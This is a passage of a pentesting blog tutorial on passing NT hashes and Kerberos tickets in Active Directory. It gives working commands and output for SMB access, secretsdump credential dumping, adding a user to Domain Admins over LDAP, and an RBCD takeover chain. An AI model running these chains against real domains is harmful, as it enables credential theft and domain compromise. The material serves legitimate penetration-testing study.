<p><strong>Why:</strong> Often times you may not have administrative access to a system, despite having recovered valid hashes.&nbsp; Consider the following scenario: You compromised a single host and dumped hashes.&nbsp; One of the hashes belongs to the head of Finance.&nbsp; They do not have administrative access over infrastructure, but have access to troves of confidential data on the file server.<br>
<strong>How:</strong> smbclient has a –pw-nt-hash flag that you can use to pass an NT Hash.</p>
<div><div id="highlighter_731659" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local</code></div><div class="line number2 index1 alt1"><code class="plain plain">Try "help" to get a list of possible commands.</code></div><div class="line number3 index2 alt2"><code class="plain plain">smb: \&gt;</code></div></div></td></tr></tbody></table></div></div>
<h1>LDAP</h1>
<p><strong>What:</strong> Active Directory is the Windows implementation of a general-purpose directory service, which uses LDAP as its primary access protocol.</p>
<p><strong>Why:</strong> Often times I find the best Active Directory attack chains often involve exploiting ACLs.&nbsp; Consider a common penetration testing scenario: You’ve gained access to a NT hash of a user in an IT admin group that has admin access over an exchange server.&nbsp; You do not have admin access over domain controllers.&nbsp; Exchange servers are a member of the <strong>Exchange Trusted Subsystem</strong> group, which is a member of <strong>Exchange Windows Permissions</strong> group. This group has WriteDACL access over the domain.&nbsp; It’s also important to know that computer accounts have usernames and passwords, and that these passwords are effectively uncrackable, which is why passing the hash is extremely useful.</p>
<p><strong>How:</strong><br>
First, recover the NT hash for the Exchange server.</p>
<div><div id="highlighter_511090" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1 highlighted">8</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="plain plain">[*] Dumping LSA Secrets</code></div><div class="line number4 index3 alt1"><code class="plain plain">[*] $MACHINE.ACC</code></div><div class="line number5 index4 alt2"><code class="plain plain">DOMAIN\EXCHANGE$:aes256-cts-hmac-sha1-96:fbc8df96a7709ec33edc50d2d9394d8e28c6bc65697f9bdfaf78009850cfa69d</code></div><div class="line number6 index5 alt1"><code class="plain plain">DOMAIN\EXCHANGE$:aes128-cts-hmac-sha1-96:fe0acc236a82bd74fdcaa593f51481f2</code></div><div class="line number7 index6 alt2"><code class="plain plain">DOMAIN\EXCHANGE$:des-cbc-md5:cd4308d6f285fc82</code></div><div class="line number8 index7 alt1 highlighted"><code class="plain plain">DOMAIN\EXCHANGE$:aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248:::</code></div></div></td></tr></tbody></table></div></div>
<p>Once you have the NT hash for the exchange server, you can authenticate to a domain controller using ldap3, and authenticate by passing the hash. From here you can do a lot, but a simple attack involves adding a user you control to the <strong>Domain Admins</strong> group. In this example you may of course also use the Exchange account to DCsync with secretsdump.py.&nbsp; In the case of compromising the NT hash of a member of the <a href="https://www.n00py.io/2020/01/managing-active-directory-groups-from-linux/"><strong>Account Operators</strong> </a>group, you would not be able to DCsync however, you could use this method to add users to certain groups to expand access.</p>
<div><div id="highlighter_419838" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2 highlighted">3</div><div class="line number4 index3 alt1 highlighted">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">python3</code></div><div class="line number2 index1 alt1"><code class="plain plain">&gt;&gt;&gt; import ldap3</code></div><div class="line number3 index2 alt2 highlighted"><code class="plain plain">&gt;&gt;&gt; user = 'DOMAIN\\EXCHANGE$'</code></div><div class="line number4 index3 alt1 highlighted"><code class="plain plain">&gt;&gt;&gt; password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'</code></div><div class="line number5 index4 alt2"><code class="plain plain">&gt;&gt;&gt; server = ldap3.Server('DOMAIN.LOCAL')</code></div><div class="line number6 index5 alt1"><code class="plain plain">from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM</code></div><div class="line number7 index6 alt2"><code class="plain plain">connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)</code></div><div class="line number8 index7 alt1"><code class="plain plain">&gt;&gt;&gt; connection.bind()</code></div><div class="line number9 index8 alt2"><code class="plain plain">&gt;&gt;&gt; from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups</code></div><div class="line number10 index9 alt1"><code class="plain plain">&gt;&gt;&gt; user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'</code></div><div class="line number11 index10 alt2"><code class="plain plain">&gt;&gt;&gt; group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'</code></div><div class="line number12 index11 alt1"><code class="plain plain">&gt;&gt;&gt; addUsersInGroups(connection, user_dn, group_dn)</code></div><div class="line number13 index12 alt2"><code class="plain plain">True</code></div></div></td></tr></tbody></table></div></div>
<p><strong>Resources:</strong></p>
<p><a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/</a></p>
<h1>Pass the Ticket</h1>
<p><strong>What:</strong> Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account’s password.</p>
<p><strong>Why:</strong> It may not be possible to authenticate with NTLM, and only Kerberos authentication is allowed.&nbsp; I won’t even attempt to explain how Kerberos works (I don’t quite get it honestly) but it can be very useful to understand how to use it in attacks.</p>
<p><strong>How:</strong> The normal way to create a Kerberos ticket on Linux is by using <strong>kinit</strong> with the username, domain, and password.&nbsp; If you don’t have the password, this is a problem.&nbsp; Fortunately, impacket has a tool that allows you to use an NT Hash to acquire a valid Ticket Granting Ticket (TGT) from a domain controller.&nbsp; Unfortunately however, Linux distros don’t typically have Kerberos tools installed on them and you will need to set them up.</p>
<ul>
<li>Install the kerberos package</li>
<li>Configure the AD realm</li>
<li>Get DNS working properly</li>
<li>Sync time</li>
</ul>
<p>To create a Kerberos TGT using an NT hash, run a command like below:</p>
<div><div id="highlighter_718644" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="plain plain">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="plain plain">[*] Saving ticket in user.ccache</code></div></div></td></tr></tbody></table></div></div>
<p>You will want to copy the ticket to <strong>/tmp/krb5cc_0</strong>, as a lot of tools look for it in that location.&nbsp; You also want to set the <strong>KRB5CCNAME</strong> environment variable to the ticket location, as some tools use that to find the ticket location.</p>
<div><div id="highlighter_532630" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">cp user.ccache /tmp/krb5cc_0</code></div><div class="line number2 index1 alt1"><code class="plain plain">export KRB5CCNAME=/tmp/krb5cc_0</code></div></div></td></tr></tbody></table></div></div>
<p>You can validate the ticket using klist.</p>
<div><div id="highlighter_912511" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">klist</code></div><div class="line number2 index1 alt1"><code class="plain plain">Credentials cache: FILE:/tmp/krb5cc_0</code></div><div class="line number3 index2 alt2"><code class="plain plain">Principal: user@domain.local</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="plain plain">Issued&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Expires &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Principal</code></div></div></td></tr></tbody></table></div></div>
<p>Now that you have a ticket you can use it with all of the impacket tools as an alternative to providing a password or NT hash.&nbsp; This will prove to be very useful in certain situations as you will see next.&nbsp; Do note that whenever using Kerberos authentication you will want to use DNS names of targets instead of IP addresses.</p>
<p><strong>Resources:</strong></p>
<p><a href="https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf">https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf</a></p>
<h1>Mount</h1>
<p><strong>What:</strong> On Linux a Windows share can be mounted on a particular mount point in the local directory tree using the cifs mount type within the mount tool.</p>
<p><strong>Why:</strong> While we can pass the hash using smbclient, its FTP-like interface can be limiting.&nbsp; It’s often much more useful to mount a share, that way you can interact with it via the Linux command line or via a GUI file explorer. For added user experience, you can even expose this mount point with SSHFS, so you can explore the share from the comfort of your local Windows or Mac file explorer.</p>
<p><strong>How:</strong> When mounting a share you cannot pass the hash, but you can connect with a Kerberos ticket (Which you can get by passing the hash!). Use a command similar to below to mount a share.&nbsp; If it fails wit the error “No such file or directory” It often means that your ticket isn’t where it expected it to be or the permissions do not allow mount to see it.</p>
<div><div id="highlighter_904846" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">sudo mount -t cifs -o sec=krb5,vers=3.0 '//SERVER.DOMAIN.LOCAL/SHARE' /mnt/share</code></div></div></td></tr></tbody></table></div></div>
<h1>SSH</h1>
<p><strong>What:</strong> The SSH protocol (also referred to as Secure Shell) is a method for secure remote login from one computer to another.</p>
<p><strong>Why:</strong> SSH is the standard way to log onto UNIX and Linux systems.&nbsp; All of the exec methods for Windows are unavailable.&nbsp; Typically the only real way to remotely access these systems is via this protocol.&nbsp; In larger organizations, I’ve often found that the Linux systems are joined to Active Directory.&nbsp; If you have a lost of domain groups, search them to see if there are any with unix/linux in the name.&nbsp; This a good sign that UNIX/Linux systems may be domain joined.</p>
<p><strong>How:</strong> You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!). First, try connecting using SSH and enable verbose messages.</p>
<div><div id="highlighter_658792" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2 highlighted">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ssh -o GSSAPIAuthentication=yes user@domain.local -vv</code></div><div class="line number2 index1 alt1"><code class="plain plain">debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password</code></div><div class="line number3 index2 alt2"><code class="plain plain">debug1: Next authentication method: gssapi-with-mic</code></div><div class="line number4 index3 alt1"><code class="plain plain">debug1: Unspecified GSS failure.&nbsp; Minor code may provide more information</code></div><div class="line number5 index4 alt2 highlighted"><code class="plain plain">No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1045)</code></div></div></td></tr></tbody></table></div></div>
<p>Likely you will see that it is expecting the krb5 ticket somewhere else (depends on your UID) so move your ticket there instead.</p>
<div><div id="highlighter_379184" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">cp user.ccache /tmp/krb5cc_1045</code></div></div></td></tr></tbody></table></div></div>
<p>Once you have your ticket in the right spot, try to connect again.&nbsp; If it doesn’t work, also consider using -l to specify the username.</p>
<div><div id="highlighter_952213" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">ssh -o GSSAPIAuthentication=yes user@domain.local</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="plain plain">[user@computer ~]$</code></div></div></td></tr></tbody></table></div></div>
<h1>Resource Based Constrained Delegation (RBCD)</h1>
<p><strong>What:</strong> If you have write privileges (<em>WriteDACL</em>, <em>GenericWrite</em>, <em>GenericAll</em>, etc) over a computer object, it is possible to gain elevated command execution on it.&nbsp; This is not a new way to pass the hash beyond what is previously mentioned, but this attack chain incorporates multiple PTH techniques such as PTH via SMB, PTH to LDAP, PTH to get a kerberos ticket, and finally pass the ticket.</p>
<p>In this example we are assuming one computer object has write access over another computer object.</p>
<p><strong>Why:</strong> Often times I find that there are no simple attack paths in an environment, and Active Directory privilege escalation requires exploiting ACL based attacks.</p>
<p><strong>How:</strong> First, pass the hash of a user with administrative access to the first computer to recover that computers NT hash.</p>
<div><div id="highlighter_603333" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1 highlighted">8</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">secretsdump.py ituser@PC01.domain.local -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="plain plain">[*] Dumping LSA Secrets</code></div><div class="line number4 index3 alt1"><code class="plain plain">[*] $MACHINE.ACC</code></div><div class="line number5 index4 alt2"><code class="plain plain">DOMAIN\$:aes256-cts-hmac-sha1-96:fbc8df96a7709ec33edc50d2d9394d8e28c6bc65697f9bdfaf78009850cfa69d</code></div><div class="line number6 index5 alt1"><code class="plain plain">DOMAIN\PC01$:aes128-cts-hmac-sha1-96:fe0acc236a82bd74fdcaa593f51481f2</code></div><div class="line number7 index6 alt2"><code class="plain plain">DOMAIN\PC01$:des-cbc-md5:cd4308d6f285fc82</code></div><div class="line number8 index7 alt1 highlighted"><code class="plain plain">DOMAIN\PC01$:aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248:::</code></div></div></td></tr></tbody></table></div></div>
<p>Second, use the<a href="https://github.com/NinjaStyle82/rbcd_permissions"> rbcd_permissions</a> script to pass the hash of the computer account to the domain controller via LDAP to update the <em>msDS-AllowedToActOnBehalfOfOtherIdentity</em> property for the second computer.&nbsp; This will allow the first computer to impersonate any domain user on that system.</p>
<div><div id="highlighter_302604" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">python3 rbcd.py -u PC01$ -H aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -t 'CN=PC02,CN=Computers,DC=domain,DC=local' -d domain.local -c 'CN=PC01,CN=Computers,DC=domain,DC=local'&nbsp; -l DC1.domain.local</code></div><div class="line number2 index1 alt1"><code class="plain plain">Successfully added permissions!</code></div></div></td></tr></tbody></table></div></div>
<p>Use the getST.py script from impacket to create a service ticket for an administrative user on the second computer, using the hash of the first computer.</p>
<div><div id="highlighter_808629" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">getST.py -spn cifs/PC02 -hashes aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248 -impersonate DA domain.local/PC01\$&nbsp;</code></div><div class="line number2 index1 alt1"><code class="plain plain">[*] Getting TGT for user</code></div><div class="line number3 index2 alt2"><code class="plain plain">[*] Impersonating DA</code></div><div class="line number4 index3 alt1"><code class="plain plain">[*]&nbsp;&nbsp;&nbsp;&nbsp; Requesting S4U2self</code></div><div class="line number5 index4 alt2"><code class="plain plain">[*]&nbsp;&nbsp;&nbsp;&nbsp; Requesting S4U2Proxy</code></div><div class="line number6 index5 alt1"><code class="plain plain">[*] Saving ticket in DA.ccache</code></div></div></td></tr></tbody></table></div></div>
<p>Once the ticket is created, pass the ticket to the second computer to gain administrative access over it.&nbsp; Dump hashes, pop a shell, or do whatever you need to do on that system.</p>
<div><div id="highlighter_831076" class="syntaxhighlighter  plain"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">secretsdump.py -k PC02.domain.local</code></div><div class="line number2 index1 alt1"><code class="plain plain">[*] Service RemoteRegistry is in stopped state</code></div><div class="line number3 index2 alt2"><code class="plain plain">[*] Starting service RemoteRegistry</code></div><div class="line number4 index3 alt1"><code class="plain plain">[*] Target system bootKey: 0x61cfb90260afec6e8c031f997d1df4bb</code></div><div class="line number5 index4 alt2"><code class="plain plain">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</code></div></div></td></tr></tbody></table></div></div>
<p><strong>Resources:</strong></p>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a><br>
<a href="https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations#resource-based-constrained-delegations-rbcd">https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations#resource-based-constrained-delegations-rbcd</a></p>
<h1>Conclusion</h1>
<p>There are many ways to perform the actions above, both with/without passing hashes and on Linux/Windows, however I wanted to show the ways I’ve found where passing the hash can be very useful.&nbsp; A lot of this is only possible because of the great work of open source tool (OST) developers, and bloggers who have described these techniques in detail.</p>

<div class="twitter-share"><iframe id="twitter-widget-2" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="twitter-share-button twitter-share-button-rendered twitter-tweet-button" style="position: absolute; visibility: hidden; width: 65px; height: 20px;" title="X Post Button" src="https://platform.twitter.com/widgets/tweet_button.2f70fb173b9000da126c79afe2098f02.en.html#dnt=false&amp;id=twitter-widget-2&amp;lang=en&amp;original_referer=https%3A%2F%2Fwww.n00py.io%2F2020%2F12%2Falternative-ways-to-pass-the-hash-pth%2F&amp;partner=tfwp&amp;size=m&amp;text=Alternative%20ways%20to%20Pass%20the%20Hash%20(PtH)%20%E2%80%93%20n00py%20Blog&amp;time=1718452975306&amp;type=share&amp;url=https%3A%2F%2Fwww.n00py.io%2F2020%2F12%2Falternative-ways-to-pass-the-hash-pth%2F&amp;via=n00py1" data-url="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/"></iframe><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.n00py.io%2F2020%2F12%2Falternative-ways-to-pass-the-hash-pth%2F&amp;via=n00py1" class="twitter-share-button" data-twitter-extracted-i171845297423797127="true">Tweet</a></div>
						<div class="clear"></div>
											</div>
					<br class="clear">
				</div>
				<div class="article_nav"><div class="next navbutton"><a href="https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/" rel="next">Next Post<i class="fa fa-angle-double-right"></i></a></div><div class="previous navbutton"><a href="https://www.n00py.io/2020/08/password-spraying-secure-logon-for-f5-networks/" rel="prev"><i class="fa fa-angle-double-left"></i>Previous Post</a></div><br class="clear"></div>					<hr>
					<div class="comments">
							<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2020/12/alternative-ways-to-pass-the-hash-pth/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://www.n00py.io/wp-comments-post.php" method="post" id="commentform" class="comment-form"><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required="required"></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required="required"></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="text" value="" size="30" maxlength="200" autocomplete="url"></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="11617" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">
</p><input type="hidden" name="tbQcSrRWyMVEodzT" value="U1VPM]T4sdujN0*E"><input type="hidden" name="xFEl_hUPWTReGm" value="HtRLTw2OPWzaki"><input type="hidden" name="zxjyXUZlKLpvgwRu" value="Hb8lXwF]pa5Y60qK"></form>	</div><!-- #respond -->
						</div>
					<div class="article_nav"><div class="next navbutton"><a href="https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/" rel="next">Next Post<i class="fa fa-angle-double-right"></i></a></div><div class="previous navbutton"><a href="https://www.n00py.io/2020/08/password-spraying-secure-logon-for-f5-networks/" rel="prev"><i class="fa fa-angle-double-left"></i>Previous Post</a></div><br class="clear"></div>	</div>

	<div id="sidebar-container">
		<ul id="sidebar">
	<li id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://www.n00py.io/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search …" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Search">
			</form></li>
<li id="categories-5" class="widget widget_categories"><h3 class="widget-title">Categories</h3><form action="https://www.n00py.io" method="get"><label class="screen-reader-text" for="cat">Categories</label><select name="cat" id="cat" class="postform">
	<option value="-1">Select Category</option>
	<option class="level-0" value="15">Defense</option>
	<option class="level-0" value="9">Exploit</option>
	<option class="level-0" value="11">Incident Response</option>
	<option class="level-0" value="3">OSX</option>
	<option class="level-0" value="12">Pentesting</option>
	<option class="level-0" value="8">persistence</option>
	<option class="level-0" value="2">Post Exploitation</option>
	<option class="level-0" value="14">Research</option>
	<option class="level-0" value="1">Uncategorized</option>
	<option class="level-0" value="10">Vulnerability</option>
	<option class="level-0" value="13">Walkthrough</option>
</select>
</form>
<script type="text/javascript">
/* <![CDATA[ */
(function() {
	var dropdown = document.getElementById( "cat" );
	function onCatChange() {
		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
			dropdown.parentNode.submit();
		}
	}
	dropdown.onchange = onCatChange;
})();
/* ]]> */
</script>

			</li>
<li id="rss-5" class="widget widget_rss"><h3 class="widget-title"><a class="rsswidget rss-widget-feed" href="https://www.n00py.io/feed/"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="https://www.n00py.io/wp-includes/images/rss.png" alt="RSS" loading="lazy"></a> <a class="rsswidget rss-widget-title" href="https://www.n00py.io/">n00py Blog</a></h3><ul><li><a class="rsswidget" href="https://www.n00py.io/2024/01/the-socks-we-have-at-home/">The SOCKS We Have at Home</a></li><li><a class="rsswidget" href="https://www.n00py.io/2023/04/bypassing-amazon-kids-parental-controls/">Bypassing Amazon Kids+ Parental Controls</a></li><li><a class="rsswidget" href="https://www.n00py.io/2023/02/bypassing-okta-mfa-credential-provider-for-windows/">Bypassing Okta MFA Credential Provider for Windows</a></li><li><a class="rsswidget" href="https://www.n00py.io/2023/02/cactuscon-2023-bloodhound-unleashed/">CactusCon 2023: BloodHound Unleashed</a></li><li><a class="rsswidget" href="https://www.n00py.io/2023/01/exploiting-resource-based-constrained-delegation-rbcd-with-pure-metasploit/">Exploiting Resource Based Constrained Delegation (RBCD) with Pure Metasploit</a></li><li><a class="rsswidget" href="https://www.n00py.io/2022/10/practical-attacks-against-ntlmv1/">Practical Attacks against NTLMv1</a></li><li><a class="rsswidget" href="https://www.n00py.io/2022/03/password-spraying-rapididentity-logon-portal/">Password Spraying RapidIdentity Logon Portal</a></li><li><a class="rsswidget" href="https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/">Manipulating User Passwords Without Mimikatz</a></li><li><a class="rsswidget" href="https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/">Unauthenticated Dumping of Usernames via Cisco Unified Call Manager (CUCM)</a></li><li><a class="rsswidget" href="https://www.n00py.io/2022/01/adding-dcsync-permissions-from-linux/">Adding DCSync Permissions from Linux</a></li></ul></li>
<li id="calendar-3" class="widget widget_calendar"><div id="calendar_wrap" class="calendar_wrap"><table id="wp-calendar" class="wp-calendar-table">
	<caption>December 2020</caption>
	<thead>
	<tr>
		<th scope="col" title="Monday">M</th>
		<th scope="col" title="Tuesday">T</th>
		<th scope="col" title="Wednesday">W</th>
		<th scope="col" title="Thursday">T</th>
		<th scope="col" title="Friday">F</th>
		<th scope="col" title="Saturday">S</th>
		<th scope="col" title="Sunday">S</th>
	</tr>
	</thead>
	<tbody>
	<tr>
		<td colspan="1" class="pad">&nbsp;</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td>
	</tr>
	<tr>
		<td>7</td><td>8</td><td>9</td><td>10</td><td>11</td><td>12</td><td><a href="https://www.n00py.io/2020/12/13/" aria-label="Posts published on December 13, 2020">13</a></td>
	</tr>
	<tr>
		<td>14</td><td>15</td><td>16</td><td>17</td><td>18</td><td><a href="https://www.n00py.io/2020/12/19/" aria-label="Posts published on December 19, 2020">19</a></td><td>20</td>
	</tr>
	<tr>
		<td>21</td><td>22</td><td>23</td><td>24</td><td>25</td><td>26</td><td>27</td>
	</tr>
	<tr>
		<td>28</td><td>29</td><td>30</td><td><a href="https://www.n00py.io/2020/12/31/" aria-label="Posts published on December 31, 2020">31</a></td>
		<td class="pad" colspan="3">&nbsp;</td>
	</tr>
	</tbody>
	</table><nav aria-label="Previous and next months" class="wp-calendar-nav">
		<span class="wp-calendar-nav-prev"><a href="https://www.n00py.io/2020/08/">« Aug</a></span>
		<span class="pad">&nbsp;</span>
		<span class="wp-calendar-nav-next"><a href="https://www.n00py.io/2021/05/">May »</a></span>
	</nav></div></li>
<li id="archives-4" class="widget widget_archive"><h3 class="widget-title">Archives</h3>
			<ul>
					<li><a href="https://www.n00py.io/2024/01/">January 2024</a></li>
	<li><a href="https://www.n00py.io/2023/04/">April 2023</a></li>
	<li><a href="https://www.n00py.io/2023/02/">February 2023</a></li>
	<li><a href="https://www.n00py.io/2023/01/">January 2023</a></li>
	<li><a href="https://www.n00py.io/2022/10/">October 2022</a></li>
	<li><a href="https://www.n00py.io/2022/03/">March 2022</a></li>
	<li><a href="https://www.n00py.io/2022/01/">January 2022</a></li>
	<li><a href="https://www.n00py.io/2021/09/">September 2021</a></li>
	<li><a href="https://www.n00py.io/2021/05/">May 2021</a></li>
	<li><a href="https://www.n00py.io/2020/12/">December 2020</a></li>
	<li><a href="https://www.n00py.io/2020/08/">August 2020</a></li>
	<li><a href="https://www.n00py.io/2020/05/">May 2020</a></li>
	<li><a href="https://www.n00py.io/2020/02/">February 2020</a></li>
	<li><a href="https://www.n00py.io/2020/01/">January 2020</a></li>
	<li><a href="https://www.n00py.io/2019/12/">December 2019</a></li>
	<li><a href="https://www.n00py.io/2019/06/">June 2019</a></li>
	<li><a href="https://www.n00py.io/2019/03/">March 2019</a></li>
	<li><a href="https://www.n00py.io/2018/10/">October 2018</a></li>
	<li><a href="https://www.n00py.io/2018/08/">August 2018</a></li>
